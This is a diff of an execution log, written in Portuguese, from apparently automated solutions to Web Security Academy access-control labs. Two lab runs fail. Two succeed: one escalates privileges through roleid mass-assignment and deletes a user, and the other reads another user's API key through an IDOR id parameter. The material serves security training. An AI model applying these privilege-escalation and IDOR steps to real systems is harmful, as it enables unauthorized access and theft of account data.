@@ -32,3 +32,63 @@
 [2026-10-27 14:58:27] Processamento encerrado. Itens examinados: 3
 [2026-10-27 14:58:27] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
 [2026-10-27 14:58:27] Verifique na Academy todos os itens com status 'verificar'.
+[2026-10-27 15:12:32] Laboratório: Lab: Unprotected admin functionality
+[2026-10-27 15:12:32] Script: Access Control\01-unprotected-admin-functionality.py
+[2026-10-27 15:12:32] Tentativa 1 de 1
+[2026-10-27 15:12:34] [-] No admin panel found via robots.txt or brute force.
+[2026-10-27 15:12:34] 
+[2026-10-27 15:12:34] Código de saída: 0
+[2026-10-27 15:12:34] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:12:34] Laboratório: Lab: Unprotected admin functionality with unpredictable URL
+[2026-10-27 15:12:34] Script: Access Control\02-unprotected-admin-functionality-unpredictable-url.py
+[2026-10-27 15:12:34] Tentativa 1 de 1
+[2026-10-27 15:12:36] [-] No admin URL found in page source.
+[2026-10-27 15:12:36] 
+[2026-10-27 15:12:36] Código de saída: 0
+[2026-10-27 15:12:36] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:12:36] Processamento encerrado. Itens examinados: 2
+[2026-10-27 15:12:36] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 15:12:36] Verifique na Academy todos os itens com status 'verificar'.
+[2026-10-27 15:14:01] Processamento encerrado. Itens examinados: 0
+[2026-10-27 15:14:01] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 15:14:01] Verifique na Academy todos os itens com status 'verificar'.
+[2026-10-27 15:14:06] Laboratório: Lab: Unprotected admin functionality
+[2026-10-27 15:14:06] Script: Access Control\01-unprotected-admin-functionality.py
+[2026-10-27 15:14:06] Tentativa 1 de 1
+[2026-10-27 15:14:09] [-] No admin panel found via robots.txt or brute force.
+[2026-10-27 15:14:09] 
+[2026-10-27 15:14:09] Código de saída: 0
+[2026-10-27 15:14:09] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:14:09] Laboratório: Lab: Unprotected admin functionality with unpredictable URL
+[2026-10-27 15:14:09] Script: Access Control\02-unprotected-admin-functionality-unpredictable-url.py
+[2026-10-27 15:14:09] Tentativa 1 de 1
+[2026-10-27 15:14:10] [-] No admin URL found in page source.
+[2026-10-27 15:14:10] 
+[2026-10-27 15:14:10] Código de saída: 0
+[2026-10-27 15:14:10] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:14:10] Processamento encerrado. Itens examinados: 2
+[2026-10-27 15:14:10] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 15:14:10] Verifique na Academy todos os itens com status 'verificar'.
+[2026-10-27 15:16:37] Laboratório: Lab: User role can be modified in user profile
+[2026-10-27 15:16:37] Script: Access Control\04-user-role-modified-in-user-profile.py
+[2026-10-27 15:16:37] Tentativa 1 de 1
+[2026-10-27 15:16:48] [*] Change email with roleid=2: 200
+[2026-10-27 15:16:48] [*] /admin: 200
+[2026-10-27 15:16:48] [*] Deleting carlos via: https://0af40076041a8fa7801d671500b400b8.web-security-academy.net/admin/delete?username=carlos
+[2026-10-27 15:16:48] [+] Lab solved -- carlos deleted after roleid mass-assignment.
+[2026-10-27 15:16:48] 
+[2026-10-27 15:16:48] Código de saída: 0
+[2026-10-27 15:16:48] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:16:48] Laboratório: Lab: User ID controlled by request parameter
+[2026-10-27 15:16:48] Script: Access Control\05-user-id-controlled-by-request-parameter.py
+[2026-10-27 15:16:48] Tentativa 1 de 1
+[2026-10-27 15:16:53] [*] /my-account?id=carlos: 200
+[2026-10-27 15:16:53] [+] Carlos API key: Wk3MVphUv8LLmOLJeZVPfSi3clZLRUaJ
+[2026-10-27 15:16:53] [*] Submitted: 200
+[2026-10-27 15:16:53] [+] Lab solved -- carlos's API key stolen via id parameter IDOR.
+[2026-10-27 15:16:53] 
+[2026-10-27 15:16:53] Código de saída: 0
+[2026-10-27 15:16:53] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 15:16:53] Processamento encerrado. Itens examinados: 2
+[2026-10-27 15:16:53] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 15:16:53] Verifique na Academy todos os itens com status 'verificar'.
